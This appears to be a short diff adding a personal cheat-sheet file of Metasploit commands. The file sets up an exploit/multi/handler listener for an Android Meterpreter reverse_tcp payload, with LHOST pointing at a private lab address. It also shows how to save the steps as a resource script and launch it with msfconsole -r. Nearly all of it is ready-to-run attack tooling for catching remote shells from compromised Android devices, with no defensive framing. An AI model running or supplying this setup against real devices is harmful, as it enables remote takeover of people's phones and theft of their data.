@@ -1,0 +1,32 @@
+makerc handler_tcp.rc
+
+OR
+
+Create profile_name.rc
+
+clear
+
+msfconsole -q
+
+
+use exploit/multi/handler
+
+
+set payload android/meterpreter/reverse_tcp
+
+show option
+
+set LHOST 192.168.153.128
+
+
+exploit
+
+
+
+Run Script
+
+msfconsole -r handler_tcp.rc
+
+or
+
+msfconsole -r profile_name.rc
